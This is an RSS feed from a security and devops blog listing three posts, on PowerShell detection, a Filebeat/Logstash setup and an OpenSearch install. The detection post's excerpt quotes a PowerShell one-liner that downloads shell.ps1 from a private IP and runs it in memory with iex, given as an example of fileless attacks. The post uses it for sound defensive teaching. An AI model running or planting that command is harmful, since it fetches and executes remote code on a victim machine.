<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>soc on It&#39;s a Dev&#39;s world</title>
    <link>https://jackleila.github.io/programming/public/categories/soc/</link>
    <description>Recent content in soc on It&#39;s a Dev&#39;s world</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Sun, 05 Oct 2025 19:57:34 +0200</lastBuildDate>
    <atom:link href="https://jackleila.github.io/programming/public/categories/soc/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Detecting suspicious PowerShell usage</title>
      <link>https://jackleila.github.io/programming/public/post/detecting-suspicious-powershell-usage/</link>
      <pubDate>Sun, 05 Oct 2025 19:57:34 +0200</pubDate>
      <guid>https://jackleila.github.io/programming/public/post/detecting-suspicious-powershell-usage/</guid>
      <description>Detecting Suspicious PowerShell Usage In the recent years there was an increase in the fileless techniques that abuse Powershell and other applications (LOTLs) to download and execute malware. These attacks occur generally in memory, which makes detection more complicated than traditional malware.&#xA;Let&amp;rsquo;s take a look at this example:&#xA;powershell.exe -command &amp;quot;iex(New-Object Net.WebClient).DownloadString(‘http://10.10.13.1/shell.ps1’)&amp;quot;&#xA;The script shell.ps1 is downloaded and directly executed in memory through iex. Many times, attackers will encode or offuscate the commands to avoid the detection.</description>
    </item>
    <item>
      <title>Configuring Filebeat and Logstash with Opensearch</title>
      <link>https://jackleila.github.io/programming/public/post/configuring-filebeat-and-logstash/</link>
      <pubDate>Sun, 20 Jul 2025 17:34:16 +0200</pubDate>
      <guid>https://jackleila.github.io/programming/public/post/configuring-filebeat-and-logstash/</guid>
      <description>In this post we will make Opensearch work with Filebeat and logstash to send, parse and analyze logs.&#xA;Installing Filebeat and Logstash Download Filebeat here and Logstash here.&#xA;Configurations In filebeat.yml, enter the following:&#xA;filebeat.inputs: - type: filestream id: my-filestream-id enabled: true paths: - C:\logs\*.log output.logstash: hosts: [&amp;#34;localhost:5044&amp;#34;] In paths, you can specify any path were you will be storing your logs. Since this is a simple tutorial for testing the setup, I created a logs folder in C, were I manually added some sample logs.</description>
    </item>
    <item>
      <title>Easy Opensearch Installation</title>
      <link>https://jackleila.github.io/programming/public/post/easy-opensearch-installation/</link>
      <pubDate>Sun, 20 Jul 2025 14:50:37 +0200</pubDate>
      <guid>https://jackleila.github.io/programming/public/post/easy-opensearch-installation/</guid>
      <description>Opensearch quickly installation guide This post is a small summary of how to quickly get started with Opensearch. The installation is done with Docker using the docker compose file found in the official repo.&#xA;In the recent versions of Opensearch you need to specify the OPENSEARCH_INITIAL_ADMIN_PASSWORD as an enviromental variable, otherwise it will not work.&#xA;Something important is, the documentation specifies that you need to ensure that vm.max_map_count is set to at least 262144.</description>
    </item>
  </channel>
</rss>
